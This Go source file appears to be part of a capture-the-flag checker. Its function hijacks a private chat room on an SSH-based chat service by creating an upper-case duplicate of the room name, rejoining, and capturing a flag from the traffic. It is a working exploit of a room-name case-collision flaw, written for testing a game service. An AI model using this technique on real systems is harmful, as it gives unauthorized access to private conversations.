package handler

import (
	"bufio"
	"checker/pkg/client"
	"context"
	"fmt"
	"regexp"
	"strings"
	"time"

	"github.com/acarl005/stripansi"
)

func (h *Handler) hijackPrivateRoom(ctx context.Context, roomName, addr, flagReStr string) (string, error) {
	if len(roomName) == 0 {
		return "", fmt.Errorf("attackInfo missing")
	}

	flagRe, err := regexp.Compile(flagReStr)
	if err != nil {
		return "", err
	}

	upperRoom := strings.ToUpper(roomName)
	hijacker, err := client.GenerateNewUser()
	if err != nil {
		return "", err
	}

	_, sessIO, ch, err := client.CreateSSHSession(ctx, hijacker.Name, addr, hijacker.PrivateKey)
	if err != nil {
		return "", err
	}

	createRoom := fmt.Sprintf("/create %s asdfasdf", upperRoom)
	err = h.sendMessageAndCheckResponse(ctx, sessIO, createRoom, upperRoom+" was created")
	if err != nil {
		ch.Execute()
		return "", err
	}

	// leave chat and rejoin
	<-time.After(time.Second)
	ch.Execute()
	<-time.After(time.Second)

	_, sessIO, ch, err = client.CreateSSHSession(ctx, hijacker.Name, addr, hijacker.PrivateKey)
	if err != nil {
		return "", err
	}
	defer ch.Execute()

	flagChan := make(chan string)
	scanner := bufio.NewScanner(sessIO)
	go func() {
		for scanner.Scan() {
			txt := stripansi.Strip(scanner.Text())
			flags := flagRe.FindAllString(txt, 1)
			if len(flags) > 0 {
				flagChan <- flags[0]
				break
			}
		}
		if err := scanner.Err(); err != nil {
			h.log.Println(err)
		}
		close(flagChan)
	}()

	select {
	case <-time.After(time.Second * 5):
		return "", fmt.Errorf("flag not found")
	case <-ctx.Done():
		return "", ctx.Err()
	case flag := <-flagChan:
		return flag, nil
	}
}
